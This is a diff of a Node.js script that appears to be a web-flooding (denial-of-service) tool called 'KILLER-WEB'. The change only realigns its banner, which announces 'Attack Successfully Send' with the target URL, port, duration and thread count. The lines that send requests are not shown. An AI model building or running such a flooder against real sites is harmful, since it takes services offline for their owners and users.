@@ -31,23 +31,23 @@ const time = Number(process.argv[3])
 const threads = Number(process.argv[4]) || 1;
 
 console.log(`    
-                  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗         
-                  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║         
-                  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝         
-                ╚╦════════════════════════════════╦╝       
-           ╔═════╩════════════════════════════════╩═════╗  
-                   👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾          
+         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗         
+         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║         
+         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝                    
+      ╚╦════════════════════════════════╦╝       
+╔═════╩════════════════════════════════╩═════╗  
+        👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾          
                                                            
-                   TARGET   : [${url}]      
-                   PORT     : [80]                        
-                   DURATION : [${time}]                        
-                   THEARDS  : [${threads}]       
-                   METHODS  : [KILLER-WEB]
-                   SENT BY  : [PabloTzy x Podi Xyz]          
-                   COOLDOWN : [0]                          
-                   CONCS    : [1]                          
-                   VIP      : [True]                       
-           ╚════════════════════════════════════════════╝  `)
+        TARGET   : [${url}]      
+        PORT     : [80]                        
+        DURATION : [${time}]                        
+        THEARDS  : [${threads}]       
+        METHODS  : [KILLER-WEB]
+        SENT BY  : [PabloTzy x Podi Xyz]          
+        COOLDOWN : [0]                          
+        CONCS    : [1]                          
+        VIP      : [True]                       
+╚════════════════════════════════════════════╝  `)
 
 for (let i = 0; i < threads; i++) {
     const int = setInterval(() => {
